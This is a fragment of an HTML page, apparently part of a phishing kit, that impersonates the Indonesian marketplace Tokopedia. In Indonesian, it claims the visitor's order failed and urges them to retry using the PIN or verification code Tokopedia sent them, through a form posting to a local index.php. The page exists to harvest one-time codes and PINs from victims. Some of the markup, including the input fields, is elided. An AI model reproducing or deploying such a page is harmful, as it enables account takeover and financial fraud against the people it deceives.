...
<h3><center><b>PESANAN ANDA TIDAK DAPAT DIPROSES</b></h3>
<p><center>JIKA GAGAL MENGGUNAKAN PIN TOKOPEDIA SILAHKAN DI ULANGI DAN GUNAKAN KODE YANG DI TERIMA DARI TOKOPEDIA  </center></p>
<hr>
<p>
<br>
<form novalidate="novalidate" class="new_user_session" id="new_user_session" action="index.php" accept-charset="UTF-8" method="post"/>
...
<br>
<input type="submit" name="commit" value="Coba Lagi Dan Gunakan kode yang di terima " class="btn btn--green btn--medium btn--block js-btn-menu-login" />
</div>